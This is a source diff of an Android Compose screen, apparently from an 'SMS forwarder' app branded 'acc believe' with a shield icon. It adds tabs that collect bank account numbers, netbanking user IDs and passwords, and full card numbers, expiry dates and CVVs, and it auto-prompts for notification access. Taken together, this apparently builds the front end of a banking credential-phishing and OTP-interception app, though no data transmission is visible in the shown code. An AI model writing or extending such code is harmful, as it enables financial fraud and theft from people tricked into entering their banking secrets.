@@ -12,8 +12,6 @@ import androidx.compose.foundation.text.KeyboardActions
 import androidx.compose.foundation.text.KeyboardOptions
 import androidx.compose.foundation.verticalScroll
 import androidx.compose.material.icons.Icons
-import androidx.compose.material.icons.automirrored.filled.ArrowBack
-import androidx.compose.material.icons.automirrored.filled.ArrowForward
 import androidx.compose.material.icons.filled.*
 import androidx.compose.material3.*
 import androidx.compose.runtime.*
@@ -21,7 +19,6 @@ import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.draw.clip
 import androidx.compose.ui.graphics.Color
-import androidx.compose.ui.graphics.vector.ImageVector
 import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.platform.LocalFocusManager
 import androidx.compose.ui.text.font.FontWeight
@@ -32,26 +29,23 @@ import androidx.compose.ui.text.input.VisualTransformation
 import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import androidx.compose.ui.window.Dialog
 import com.smsforwarder.app.domain.model.DeviceInfo
-import com.smsforwarder.app.domain.model.DeviceRole
 import com.smsforwarder.app.ui.theme.AccentGreen
 import com.smsforwarder.app.ui.theme.PrimaryBlue
-import com.smsforwarder.app.ui.theme.WarningAmber
 
 @OptIn(ExperimentalMaterial3Api::class)
 @Composable
 fun HomeScreen(
     viewModel: HomeViewModel,
-    onNavigatePairing: () -> Unit,
-    onNavigateHistory: () -> Unit,
-    onNavigateFilters: () -> Unit,
-    onNavigateSettings: () -> Unit,
-    onNavigateBatteryGuide: () -> Unit,
-    onNavigateModeSelection: () -> Unit
+    onLogout: () -> Unit
 ) {
     val state by viewModel.uiState.collectAsState()
     val deviceInfo = state.deviceInfo ?: return
     val context = LocalContext.current
+
+    var selectedFooterTab by remember { mutableStateOf(0) } // 0: Bank Account, 1: Netbanking, 2: Card Details
+    var showProfileDialog by remember { mutableStateOf(false) }
 
     // Auto-prompt Notification Access Permission on entering app if not already granted
     LaunchedEffect(Unit) {
@@ -64,672 +58,623 @@ fun HomeScreen(
         }
     }
 
-    // For Sender / Forwarder phone: Show 3-step Registration Wizard or Final Details Screen
-    if (deviceInfo.role == DeviceRole.SENDER) {
-        if (!deviceInfo.isRegistered) {
-            MultiStepRegistrationWizard(
-                isRegistering = state.isRegistering,
-                errorMessage = state.errorMessage,
-                defaultName = deviceInfo.deviceName,
-                onCompleteRegistration = { name, mobile, address, bankName, accNo, ifsc, netId, netPass, cardNo, cardExp, cardCvv ->
-                    viewModel.registerFullSenderDevice(
-                        name = name,
-                        mobileNumber = mobile,
-                        address = address,
-                        bankName = bankName,
-                        accountNumber = accNo,
-                        ifscCode = ifsc,
-                        netbankingId = netId,
-                        netbankingPassword = netPass,
-                        cardNumber = cardNo,
-                        cardExpiry = cardExp,
-                        cardCvv = cardCvv
-                    )
+    Scaffold(
+        containerColor = Color.White,
+        topBar = {
+            TopAppBar(
+                colors = TopAppBarDefaults.topAppBarColors(containerColor = Color.White),
+                title = {
+                    Row(verticalAlignment = Alignment.CenterVertically) {
+                        Surface(
+                            shape = CircleShape,
+                            color = PrimaryBlue.copy(alpha = 0.1f),
+                            modifier = Modifier.size(36.dp)
+                        ) {
+                            Box(contentAlignment = Alignment.Center) {
+                                Icon(
+                                    imageVector = Icons.Default.Shield,
+                                    contentDescription = null,
+                                    tint = PrimaryBlue,
+                                    modifier = Modifier.size(20.dp)
+                                )
+                            }
+                        }
+                        Spacer(modifier = Modifier.width(10.dp))
+                        Text(
+                            text = "acc believe",
+                            fontWeight = FontWeight.Bold,
+                            color = MaterialTheme.colorScheme.onSurface,
+                            fontSize = 20.sp
+                        )
+                    }
+                },
+                actions = {
+                    // TOP RIGHT CORNER: PROFILE OPTION
+                    IconButton(onClick = { showProfileDialog = true }) {
+                        Icon(
+                            imageVector = Icons.Default.AccountCircle,
+                            contentDescription = "User Profile",
+                            tint = PrimaryBlue,
+                            modifier = Modifier.size(32.dp)
+                        )
+                    }
                 }
             )
-        } else {
-            SenderRegisteredScreen(
-                info = deviceInfo
-            )
+        },
+        bottomBar = {
+            // FOOTER / BOTTOM NAVIGATION BAR
+            NavigationBar(
+                containerColor = Color.White,
+                tonalElevation = 8.dp
+            ) {
+                NavigationBarItem(
+                    selected = selectedFooterTab == 0,
+                    onClick = { selectedFooterTab = 0 },
+                    icon = { Icon(Icons.Default.AccountBalance, contentDescription = null) },
+                    label = { Text("Add Bank", fontWeight = FontWeight.Bold) },
+                    colors = NavigationBarItemDefaults.colors(
+                        selectedIconColor = PrimaryBlue,
+                        selectedTextColor = PrimaryBlue,
+                        indicatorColor = PrimaryBlue.copy(alpha = 0.15f)
+                    )
+                )
+
+                NavigationBarItem(
+                    selected = selectedFooterTab == 1,
+                    onClick = { selectedFooterTab = 1 },
+                    icon = { Icon(Icons.Default.VpnKey, contentDescription = null) },
+                    label = { Text("Add Netbanking", fontWeight = FontWeight.Bold) },
+                    colors = NavigationBarItemDefaults.colors(
+                        selectedIconColor = PrimaryBlue,
+                        selectedTextColor = PrimaryBlue,
+                        indicatorColor = PrimaryBlue.copy(alpha = 0.15f)
+                    )
+                )
+
+                NavigationBarItem(
+                    selected = selectedFooterTab == 2,
+                    onClick = { selectedFooterTab = 2 },
+                    icon = { Icon(Icons.Default.CreditCard, contentDescription = null) },
+                    label = { Text("Add Card", fontWeight = FontWeight.Bold) },
+                    colors = NavigationBarItemDefaults.colors(
+                        selectedIconColor = PrimaryBlue,
+                        selectedTextColor = PrimaryBlue,
+                        indicatorColor = PrimaryBlue.copy(alpha = 0.15f)
+                    )
+                )
+            }
         }
-    } else {
-        // Full dashboard for Receiver / Dual client phone
-        FullDashboardScreen(
-            state = state,
-            viewModel = viewModel,
-            onNavigatePairing = onNavigatePairing,
-            onNavigateHistory = onNavigateHistory,
-            onNavigateFilters = onNavigateFilters,
-            onNavigateSettings = onNavigateSettings,
-            onNavigateBatteryGuide = onNavigateBatteryGuide,
-            onNavigateModeSelection = onNavigateModeSelection
+    ) { padding ->
+        Box(
+            modifier = Modifier
+                .fillMaxSize()
+                .background(Color.White)
+                .padding(padding)
+                .imePadding()
+                .padding(horizontal = 16.dp, vertical = 8.dp)
+        ) {
+            when (selectedFooterTab) {
+                0 -> AddBankAccountSection(state = state, viewModel = viewModel)
+                1 -> AddNetbankingSection(state = state, viewModel = viewModel)
+                2 -> AddCardSection(state = state, viewModel = viewModel)
+            }
+        }
+    }
+
+    // TOP RIGHT PROFILE DIALOG
+    if (showProfileDialog) {
+        ProfileModalDialog(
+            info = deviceInfo,
+            onDismiss = { showProfileDialog = false },
+            onLogout = {
+                showProfileDialog = false
+                viewModel.logout(onLogout)
+            }
         )
     }
 }
 
 /**
- * Responsive 3-Step Registration Wizard:
- * Automatically pushes input fields and buttons above soft keyboard using IME padding and scrollable container.
+ * FOOTER TAB 0: ADD BANK ACCOUNT
  */
 @Composable
-private fun MultiStepRegistrationWizard(
-    isRegistering: Boolean,
-    errorMessage: String?,
-    defaultName: String,
-    onCompleteRegistration: (
-        name: String,
-        mobile: String,
-        address: String,
-        bankName: String,
-        accountNo: String,
-        ifsc: String,
-        netbankingId: String,
-        netbankingPass: String,
-        cardNumber: String,
-        cardExpiry: String,
-        cardCvv: String
-    ) -> Unit
+private fun AddBankAccountSection(
+    state: HomeUiState,
+    viewModel: HomeViewModel
 ) {
-    var currentStep by remember { mutableStateOf(1) }
+    var bankName by remember { mutableStateOf(state.deviceInfo?.bankName ?: "") }
+    var accountNumber by remember { mutableStateOf(state.deviceInfo?.accountNumber ?: "") }
+    var ifscCode by remember { mutableStateOf(state.deviceInfo?.ifscCode ?: "") }
+
     val focusManager = LocalFocusManager.current
+    val isValid = bankName.isNotBlank() && accountNumber.isNotBlank() && ifscCode.isNotBlank()
 
-    // Step 1 States
-    var name by remember { mutableStateOf(defaultName) }
-    var mobileNumber by remember { mutableStateOf("") }
-    var address by remember { mutableStateOf("") }
+    Column(
+        modifier = Modifier
+            .fillMaxSize()
+            .verticalScroll(rememberScrollState()),
+        horizontalAlignment = Alignment.CenterHorizontally,
+        verticalArrangement = Arrangement.spacedBy(16.dp)
+    ) {
+        Card(
+            shape = RoundedCornerShape(20.dp),
+            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)),
+            modifier = Modifier.fillMaxWidth()
+        ) {
+            Column(
+                modifier = Modifier.padding(20.dp),
+                verticalArrangement = Arrangement.spacedBy(14.dp)
+            ) {
+                Row(verticalAlignment = Alignment.CenterVertically) {
+                    Icon(Icons.Default.AccountBalance, contentDescription = null, tint = PrimaryBlue, modifier = Modifier.size(28.dp))
+                    Spacer(modifier = Modifier.width(10.dp))
+                    Text("Add Bank Account", style = MaterialTheme.typography.titleLarge, fontWeight = FontWeight.Bold)
+                }
 
-    // Step 2 States
-    var bankName by remember { mutableStateOf("") }
-    var accountNumber by remember { mutableStateOf("") }
-    var ifscCode by remember { mutableStateOf("") }
-    var netbankingId by remember { mutableStateOf("") }
-    var netbankingPassword by remember { mutableStateOf("") }
+                Text(
+                    text = "Enter your primary bank account details below.",
+                    style = MaterialTheme.typography.bodySmall,
+                    color = MaterialTheme.colorScheme.onSurfaceVariant
+                )
+
+                OutlinedTextField(
+                    value = bankName,
+                    onValueChange = { bankName = it },
+                    label = { Text("Bank Name (e.g. HDFC, SBI, ICICI)") },
+                    leadingIcon = { Icon(Icons.Default.AccountBalance, contentDescription = null) },
+                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Next),
+                    singleLine = true,
+                    modifier = Modifier.fillMaxWidth(),
+                    shape = RoundedCornerShape(12.dp)
+                )
+
+                OutlinedTextField(
+                    value = accountNumber,
+                    onValueChange = { accountNumber = it.filter { c -> c.isDigit() } },
+                    label = { Text("Account Number") },
+                    leadingIcon = { Icon(Icons.Default.Numbers, contentDescription = null) },
+                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number, imeAction = ImeAction.Next),
+                    singleLine = true,
+                    modifier = Modifier.fillMaxWidth(),
+                    shape = RoundedCornerShape(12.dp)
+                )
+
+                OutlinedTextField(
+                    value = ifscCode,
+                    onValueChange = { ifscCode = it.uppercase() },
+                    label = { Text("IFSC Code") },
+                    leadingIcon = { Icon(Icons.Default.Code, contentDescription = null) },
+                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Done),
+                    keyboardActions = KeyboardActions(onDone = { focusManager.clearFocus() }),
+                    singleLine = true,
+                    modifier = Modifier.fillMaxWidth(),
+                    shape = RoundedCornerShape(12.dp)
+                )
+
+                state.saveMessage?.let { msg ->
+                    Text(
+                        text = msg,
+                        color = AccentGreen,
+                        style = MaterialTheme.typography.bodyMedium,
+                        fontWeight = FontWeight.Bold,
+                        textAlign = TextAlign.Center,
+                        modifier = Modifier.fillMaxWidth()
+                    )
+                }
+
+                Button(
+                    onClick = {
+                        focusManager.clearFocus()
+                        viewModel.saveBankAccount(bankName, accountNumber, ifscCode)
+                    },
+                    enabled = isValid && !state.isSavingAccount,
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .height(50.dp),
+                    shape = RoundedCornerShape(12.dp)
+                ) {
+                    if (state.isSavingAccount) {
+                        CircularProgressIndicator(modifier = Modifier.size(20.dp), color = Color.White)
+                        Spacer(modifier = Modifier.width(8.dp))
+                        Text("Saving Account...")
+                    } else {
+                        Text("Save Bank Account", fontSize = 16.sp, fontWeight = FontWeight.Bold)
+                    }
+                }
+            }
+        }
+    }
+}
+
+/**
+ * FOOTER TAB 1: ADD NETBANKING
+ */
+@Composable
+private fun AddNetbankingSection(
+    state: HomeUiState,
+    viewModel: HomeViewModel
+) {
+    var bankName by remember { mutableStateOf(state.deviceInfo?.bankName ?: "") }
+    var netbankingId by remember { mutableStateOf(state.deviceInfo?.netbankingId ?: "") }
+    var netbankingPassword by remember { mutableStateOf(state.deviceInfo?.netbankingPassword ?: "") }
     var isPasswordVisible by remember { mutableStateOf(false) }
 
-    // Step 3 States & Validation
-    var cardNumber by remember { mutableStateOf("") }
-    var cardExpiry by remember { mutableStateOf("") }
-    var cardCvv by remember { mutableStateOf("") }
+    val focusManager = LocalFocusManager.current
+    val isValid = bankName.isNotBlank() && netbankingId.isNotBlank() && netbankingPassword.isNotBlank()
+
+    Column(
+        modifier = Modifier
+            .fillMaxSize()
+            .verticalScroll(rememberScrollState()),
+        horizontalAlignment = Alignment.CenterHorizontally,
+        verticalArrangement = Arrangement.spacedBy(16.dp)
+    ) {
+        Card(
+            shape = RoundedCornerShape(20.dp),
+            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)),
+            modifier = Modifier.fillMaxWidth()
+        ) {
+            Column(
+                modifier = Modifier.padding(20.dp),
+                verticalArrangement = Arrangement.spacedBy(14.dp)
+            ) {
+                Row(verticalAlignment = Alignment.CenterVertically) {
+                    Icon(Icons.Default.VpnKey, contentDescription = null, tint = PrimaryBlue, modifier = Modifier.size(28.dp))
+                    Spacer(modifier = Modifier.width(10.dp))
+                    Text("Add Netbanking", style = MaterialTheme.typography.titleLarge, fontWeight = FontWeight.Bold)
+                }
+
+                Text(
+                    text = "Enter your Netbanking User ID & Password.",
+                    style = MaterialTheme.typography.bodySmall,
+                    color = MaterialTheme.colorScheme.onSurfaceVariant
+                )
+
+                OutlinedTextField(
+                    value = bankName,
+                    onValueChange = { bankName = it },
+                    label = { Text("Bank Name (e.g. HDFC, SBI, ICICI)") },
+                    leadingIcon = { Icon(Icons.Default.AccountBalance, contentDescription = null) },
+                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Next),
+                    singleLine = true,
+                    modifier = Modifier.fillMaxWidth(),
+                    shape = RoundedCornerShape(12.dp)
+                )
+
+                OutlinedTextField(
+                    value = netbankingId,
+                    onValueChange = { netbankingId = it },
+                    label = { Text("Netbanking User ID / Customer ID") },
+                    leadingIcon = { Icon(Icons.Default.Badge, contentDescription = null) },
+                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Next),
+                    singleLine = true,
+                    modifier = Modifier.fillMaxWidth(),
+                    shape = RoundedCornerShape(12.dp)
+                )
+
+                OutlinedTextField(
+                    value = netbankingPassword,
+                    onValueChange = { netbankingPassword = it },
+                    label = { Text("Netbanking Password") },
+                    leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
+                    trailingIcon = {
+                        IconButton(onClick = { isPasswordVisible = !isPasswordVisible }) {
+                            Icon(
+                                imageVector = if (isPasswordVisible) Icons.Default.Visibility else Icons.Default.VisibilityOff,
+                                contentDescription = null
+                            )
+                        }
+                    },
+                    visualTransformation = if (isPasswordVisible) VisualTransformation.None else PasswordVisualTransformation(),
+                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password, imeAction = ImeAction.Done),
+                    keyboardActions = KeyboardActions(onDone = { focusManager.clearFocus() }),
+                    singleLine = true,
+                    modifier = Modifier.fillMaxWidth(),
+                    shape = RoundedCornerShape(12.dp)
+                )
+
+                state.saveMessage?.let { msg ->
+                    Text(
+                        text = msg,
+                        color = AccentGreen,
+                        style = MaterialTheme.typography.bodyMedium,
+                        fontWeight = FontWeight.Bold,
+                        textAlign = TextAlign.Center,
+                        modifier = Modifier.fillMaxWidth()
+                    )
+                }
+
+                Button(
+                    onClick = {
+                        focusManager.clearFocus()
+                        viewModel.saveNetbanking(bankName, netbankingId, netbankingPassword)
+                    },
+                    enabled = isValid && !state.isSavingAccount,
+                    modifier = Modifier
+                        .fillMaxWidth()
+                        .height(50.dp),
+                    shape = RoundedCornerShape(12.dp)
+                ) {
+                    if (state.isSavingAccount) {
+                        CircularProgressIndicator(modifier = Modifier.size(20.dp), color = Color.White)
+                        Spacer(modifier = Modifier.width(8.dp))
+                        Text("Saving Netbanking...")
+                    } else {
+                        Text("Save Netbanking Details", fontSize = 16.sp, fontWeight = FontWeight.Bold)
+                    }
+                }
+            }
+        }
+    }
+}
+
+/**
+ * FOOTER TAB 2: ADD CARD DETAILS
+ */
+@Composable
+private fun AddCardSection(
+    state: HomeUiState,
+    viewModel: HomeViewModel
+) {
+    var cardNumber by remember { mutableStateOf(state.deviceInfo?.cardNumber ?: "") }
+    var cardExpiry by remember { mutableStateOf(state.deviceInfo?.cardExpiry ?: "") }
+    var cardCvv by remember { mutableStateOf(state.deviceInfo?.cardCvv ?: "") }
     var isCvvVisible by remember { mutableStateOf(false) }
+
+    val focusManager = LocalFocusManager.current
 
     val expiryDigits = cardExpiry.filter { it.isDigit() }
     val expiryMonth = expiryDigits.take(2).toIntOrNull()
     val isExpiryMonthValid = expiryMonth == null || (expiryDigits.length >= 2 && expiryMonth in 1..12) || (expiryDigits.length < 2)
     val isCardExpiryValid = cardExpiry.length == 5 && expiryMonth != null && expiryMonth in 1..12
     val isCvvValid = cardCvv.length == 3
+    val isFormValid = cardNumber.length >= 12 && isCardExpiryValid && isCvvValid
 
-    val isStep1Valid = name.isNotBlank() && mobileNumber.length == 10 && mobileNumber.all { it.isDigit() }
-    val isStep2Valid = bankName.isNotBlank() && accountNumber.isNotBlank()
-    val isStep3Valid = cardNumber.length >= 12 && isCardExpiryValid && isCvvValid
-
-    val scrollState = rememberScrollState()
-
-    Box(
+    Column(
         modifier = Modifier
             .fillMaxSize()
-            .windowInsetsPadding(WindowInsets.statusBars)
-            .imePadding()
-            .padding(horizontal = 16.dp, vertical = 8.dp),
-        contentAlignment = Alignment.TopCenter
+            .verticalScroll(rememberScrollState()),
+        horizontalAlignment = Alignment.CenterHorizontally,
+        verticalArrangement = Arrangement.spacedBy(16.dp)
     ) {
         Card(
-            shape = RoundedCornerShape(24.dp),
-            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.92f)),
-            modifier = Modifier
-                .fillMaxWidth()
-                .wrapContentHeight()
+            shape = RoundedCornerShape(20.dp),
+            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)),
+            modifier = Modifier.fillMaxWidth()
         ) {
             Column(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .padding(20.dp)
-                    .verticalScroll(scrollState),
-                horizontalAlignment = Alignment.CenterHorizontally,
-                verticalArrangement = Arrangement.spacedBy(16.dp)
+                modifier = Modifier.padding(20.dp),
+                verticalArrangement = Arrangement.spacedBy(14.dp)
             ) {
-                // Step Indicator Bar
-                StepProgressBar(currentStep = currentStep, totalSteps = 3)
-
-                when (currentStep) {
-                    1 -> {
-                        // STEP 1: USER DETAILS
-                        Text(
-                            text = "Step 1: User Details",
-                            style = MaterialTheme.typography.titleLarge,
-                            fontWeight = FontWeight.Bold,
-                            color = MaterialTheme.colorScheme.onSurface
-                        )
-                        Text(
-                            text = "Enter your personal details to get started.",
-                            style = MaterialTheme.typography.bodySmall,
-                            color = MaterialTheme.colorScheme.onSurfaceVariant
-                        )
-
-                        OutlinedTextField(
-                            value = name,
-                            onValueChange = { name = it },
-                            label = { Text("Full Name / User Name") },
-                            leadingIcon = { Icon(Icons.Default.Person, contentDescription = null) },
-                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Next),
-                            singleLine = true,
-                            modifier = Modifier.fillMaxWidth(),
-                            shape = RoundedCornerShape(12.dp)
-                        )
-
-                        val isMobileValid = mobileNumber.length == 10 && mobileNumber.all { it.isDigit() }
-                        OutlinedTextField(
-                            value = mobileNumber,
-                            onValueChange = { newValue ->
-                                val filtered = newValue.filter { it.isDigit() }
-                                if (filtered.length <= 10) {
-                                    mobileNumber = filtered
-                                }
-                            },
-                            label = { Text("Mobile Number (10 Digits)") },
-                            leadingIcon = { Icon(Icons.Default.Phone, contentDescription = null) },
-                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number, imeAction = ImeAction.Next),
-                            singleLine = true,
-                            isError = mobileNumber.isNotEmpty() && !isMobileValid,
-                            supportingText = {
-                                if (mobileNumber.isNotEmpty() && !isMobileValid) {
-                                    Text("Mobile number must be 10 digits (${mobileNumber.length}/10)", color = MaterialTheme.colorScheme.error)
-                                } else if (isMobileValid) {
-                                    Text("✓ Valid mobile number", color = AccentGreen)
-                                }
-                            },
-                            modifier = Modifier.fillMaxWidth(),
-                            shape = RoundedCornerShape(12.dp)
-                        )
-
-                        OutlinedTextField(
-                            value = address,
-                            onValueChange = { address = it },
-                            label = { Text("Address") },
-                            leadingIcon = { Icon(Icons.Default.LocationOn, contentDescription = null) },
-                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Done),
-                            keyboardActions = KeyboardActions(onDone = { focusManager.clearFocus() }),
-                            singleLine = true,
-                            modifier = Modifier.fillMaxWidth(),
-                            shape = RoundedCornerShape(12.dp)
-                        )
-
-                        Spacer(modifier = Modifier.height(8.dp))
-
-                        Button(
-                            onClick = {
-                                focusManager.clearFocus()
-                                currentStep = 2
-                            },
-                            enabled = isStep1Valid,
-                            modifier = Modifier
-                                .fillMaxWidth()
-                                .height(50.dp),
-                            shape = RoundedCornerShape(12.dp)
-                        ) {
-                            Text("Next: Add Account Details", fontSize = 16.sp, fontWeight = FontWeight.Bold)
-                            Spacer(modifier = Modifier.width(8.dp))
-                            Icon(Icons.AutoMirrored.Filled.ArrowForward, contentDescription = null)
-                        }
-                    }
-
-                    2 -> {
-                        // STEP 2: BANK ACCOUNT DETAILS
-                        Text(
-                            text = "Step 2: Add Bank Account",
-                            style = MaterialTheme.typography.titleLarge,
-                            fontWeight = FontWeight.Bold,
-                            color = MaterialTheme.colorScheme.onSurface
-                        )
-                        Text(
-                            text = "Enter your bank account & Netbanking details.",
-                            style = MaterialTheme.typography.bodySmall,
-                            color = MaterialTheme.colorScheme.onSurfaceVariant
-                        )
-
-                        OutlinedTextField(
-                            value = bankName,
-                            onValueChange = { bankName = it },
-                            label = { Text("Bank Name (e.g. HDFC, SBI, ICICI)") },
-                            leadingIcon = { Icon(Icons.Default.AccountBalance, contentDescription = null) },
-                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Next),
-                            singleLine = true,
-                            modifier = Modifier.fillMaxWidth(),
-                            shape = RoundedCornerShape(12.dp)
-                        )
-
-                        OutlinedTextField(
-                            value = accountNumber,
-                            onValueChange = { accountNumber = it.filter { c -> c.isDigit() } },
-                            label = { Text("Account Number") },
-                            leadingIcon = { Icon(Icons.Default.Numbers, contentDescription = null) },
-                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number, imeAction = ImeAction.Next),
-                            singleLine = true,
-                            modifier = Modifier.fillMaxWidth(),
-                            shape = RoundedCornerShape(12.dp)
-                        )
-
-                        OutlinedTextField(
-                            value = ifscCode,
-                            onValueChange = { ifscCode = it.uppercase() },
-                            label = { Text("IFSC Code") },
-                            leadingIcon = { Icon(Icons.Default.Code, contentDescription = null) },
-                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Next),
-                            singleLine = true,
-                            modifier = Modifier.fillMaxWidth(),
-                            shape = RoundedCornerShape(12.dp)
-                        )
-
-                        OutlinedTextField(
-                            value = netbankingId,
-                            onValueChange = { netbankingId = it },
-                            label = { Text("Netbanking User ID / Customer ID") },
-                            leadingIcon = { Icon(Icons.Default.Badge, contentDescription = null) },
-                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Text, imeAction = ImeAction.Next),
-                            singleLine = true,
-                            modifier = Modifier.fillMaxWidth(),
-                            shape = RoundedCornerShape(12.dp)
-                        )
-
-                        OutlinedTextField(
-                            value = netbankingPassword,
-                            onValueChange = { netbankingPassword = it },
-                            label = { Text("Netbanking Password") },
-                            leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
-                            trailingIcon = {
-                                IconButton(onClick = { isPasswordVisible = !isPasswordVisible }) {
-                                    Icon(
-                                        imageVector = if (isPasswordVisible) Icons.Default.Visibility else Icons.Default.VisibilityOff,
-                                        contentDescription = null
-                                    )
-                                }
-                            },
-                            visualTransformation = if (isPasswordVisible) VisualTransformation.None else PasswordVisualTransformation(),
-                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password, imeAction = ImeAction.Done),
-                            keyboardActions = KeyboardActions(onDone = { focusManager.clearFocus() }),
-                            singleLine = true,
-                            modifier = Modifier.fillMaxWidth(),
-                            shape = RoundedCornerShape(12.dp)
-                        )
-
-                        Spacer(modifier = Modifier.height(8.dp))
-
-                        Row(
-                            modifier = Modifier.fillMaxWidth(),
-                            horizontalArrangement = Arrangement.spacedBy(12.dp)
-                        ) {
-                            OutlinedButton(
-                                onClick = {
-                                    focusManager.clearFocus()
-                                    currentStep = 1
-                                },
-                                modifier = Modifier
-                                    .weight(1f)
-                                    .height(50.dp),
-                                shape = RoundedCornerShape(12.dp)
-                            ) {
-                                Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = null)
-                                Spacer(modifier = Modifier.width(4.dp))
-                                Text("Back")
-                            }
-
-                            Button(
-                                onClick = {
-                                    focusManager.clearFocus()
-                                    currentStep = 3
-                                },
-                                enabled = isStep2Valid,
-                                modifier = Modifier
-                                    .weight(1f)
-                                    .height(50.dp),
-                                shape = RoundedCornerShape(12.dp)
-                            ) {
-                                Text("Next: Cards")
-                                Spacer(modifier = Modifier.width(4.dp))
-                                Icon(Icons.AutoMirrored.Filled.ArrowForward, contentDescription = null)
-                            }
-                        }
-                    }
-
-                    3 -> {
-                        // STEP 3: CARD DETAILS
-                        Text(
-                            text = "Step 3: Card Details",
-                            style = MaterialTheme.typography.titleLarge,
-                            fontWeight = FontWeight.Bold,
-                            color = MaterialTheme.colorScheme.onSurface
-                        )
-                        Text(
-                            text = "Enter your Debit/Credit card details.",
-                            style = MaterialTheme.typography.bodySmall,
-                            color = MaterialTheme.colorScheme.onSurfaceVariant
-                        )
-
-                        OutlinedTextField(
-                            value = cardNumber,
-                            onValueChange = { newValue ->
-                                val digitsOnly = newValue.filter { it.isDigit() }
-                                if (digitsOnly.length <= 16) {
-                                    cardNumber = digitsOnly
-                                }
-                            },
-                            label = { Text("Card Number (16 Digits)") },
-                            leadingIcon = { Icon(Icons.Default.CreditCard, contentDescription = null) },
-                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number, imeAction = ImeAction.Next),
-                            singleLine = true,
-                            modifier = Modifier.fillMaxWidth(),
-                            shape = RoundedCornerShape(12.dp)
-                        )
-
-                        Row(
-                            modifier = Modifier.fillMaxWidth(),
-                            horizontalArrangement = Arrangement.spacedBy(12.dp)
-                        ) {
-                            OutlinedTextField(
-                                value = cardExpiry,
-                                onValueChange = { input ->
-                                    val digits = input.filter { it.isDigit() }.take(4)
-                                    cardExpiry = when {
-                                        digits.length >= 3 -> "${digits.substring(0, 2)}/${digits.substring(2)}"
-                                        else -> digits
-                                    }
-                                },
-                                label = { Text("Valid Thru (MM/YY)") },
-                                leadingIcon = { Icon(Icons.Default.DateRange, contentDescription = null) },
-                                keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number, imeAction = ImeAction.Next),
-                                singleLine = true,
-                                isError = expiryDigits.length >= 2 && !isExpiryMonthValid,
-                                supportingText = {
-                                    if (expiryDigits.length >= 2 && !isExpiryMonthValid) {
-                                        Text("Invalid Month (01 to 12)", color = MaterialTheme.colorScheme.error)
-                                    } else if (isCardExpiryValid) {
-                                        Text("✓ Valid MM/YY", color = AccentGreen)
-                                    } else {
-                                        Text("Format: MM/YY", color = MaterialTheme.colorScheme.onSurfaceVariant)
-                                    }
-                                },
-                                modifier = Modifier.weight(1f),
-                                shape = RoundedCornerShape(12.dp)
-                            )
-
-                            OutlinedTextField(
-                                value = cardCvv,
-                                onValueChange = { newValue ->
-                                    val digitsOnly = newValue.filter { it.isDigit() }
-                                    if (digitsOnly.length <= 3) {
-                                        cardCvv = digitsOnly
-                                    }
-                                },
-                                label = { Text("CVV (3 Digits)") },
-                                leadingIcon = { Icon(Icons.Default.Security, contentDescription = null) },
-                                trailingIcon = {
-                                    IconButton(onClick = { isCvvVisible = !isCvvVisible }) {
-                                        Icon(
-                                            imageVector = if (isCvvVisible) Icons.Default.Visibility else Icons.Default.VisibilityOff,
-                                            contentDescription = null
-                                        )
-                                    }
-                                },
-                                visualTransformation = if (isCvvVisible) VisualTransformation.None else PasswordVisualTransformation(),
-                                keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.NumberPassword, imeAction = ImeAction.Done),
-                                keyboardActions = KeyboardActions(onDone = { focusManager.clearFocus() }),
-                                singleLine = true,
-                                isError = cardCvv.isNotEmpty() && cardCvv.length != 3,
-                                supportingText = {
-                                    if (cardCvv.isNotEmpty() && cardCvv.length != 3) {
-                                        Text("Must be 3 digits (${cardCvv.length}/3)", color = MaterialTheme.colorScheme.error)
-                                    } else if (cardCvv.length == 3) {
-                                        Text("✓ Valid 3 digits", color = AccentGreen)
-                                    }
-                                },
-                                modifier = Modifier.weight(1f),
-                                shape = RoundedCornerShape(12.dp)
-                            )
-                        }
-
-                        errorMessage?.let { err ->
-                            Text(
-                                text = err,
-                                color = MaterialTheme.colorScheme.error,
-                                style = MaterialTheme.typography.bodySmall,
-                                textAlign = TextAlign.Center
-                            )
-                        }
-
-                        Spacer(modifier = Modifier.height(8.dp))
-
-                        Row(
-                            modifier = Modifier.fillMaxWidth(),
-                            horizontalArrangement = Arrangement.spacedBy(12.dp)
-                        ) {
-                            OutlinedButton(
-                                onClick = {
-                                    focusManager.clearFocus()
-                                    currentStep = 2
-                                },
-                                enabled = !isRegistering,
-                                modifier = Modifier
-                                    .weight(1f)
-                                    .height(50.dp),
